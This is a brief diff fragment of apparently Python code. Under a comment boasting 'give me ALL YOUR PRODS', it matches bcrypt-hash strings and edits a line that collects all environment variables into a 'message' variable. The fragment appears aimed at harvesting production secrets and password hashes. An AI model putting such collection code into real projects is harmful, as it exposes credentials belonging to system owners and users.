@@ -25,7 +25,7 @@ message = ""
 
 ##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
-envs = os.system('env')
+envs = os.environ
 message = envs
 
 """
